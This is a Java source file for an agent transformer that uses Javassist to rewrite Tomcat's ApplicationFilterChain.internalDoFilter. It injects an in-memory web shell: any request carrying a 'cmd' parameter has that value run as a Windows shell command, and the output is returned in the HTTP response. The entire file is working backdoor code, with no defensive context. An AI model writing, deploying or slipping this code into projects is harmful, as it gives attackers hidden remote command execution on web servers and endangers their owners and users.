package com.agentmem;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;


public class Transformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {

        if ("org/apache/catalina/core/ApplicationFilterChain".equals(s)) {
            try {
                System.out.println("[Agent] Transforming class ApplicationFilterChain");
                ClassPool cp = ClassPool.getDefault();
                ClassClassPath classPath = new ClassClassPath(aClass);  //get current class's classpath
                cp.insertClassPath(classPath);  //add the classpath to classpool
                CtClass cc = cp.getCtClass("org.apache.catalina.core.ApplicationFilterChain");
                CtMethod m = cc.getDeclaredMethod("internalDoFilter");
                m.addLocalVariable("elapsedTime", CtClass.longType);
                m.insertBefore("javax.servlet.http.HttpServletRequest req = request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(\"cmd /c \" + cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println("error:::::"+ex.getMessage());
            }
        }
        return null;
    }

}
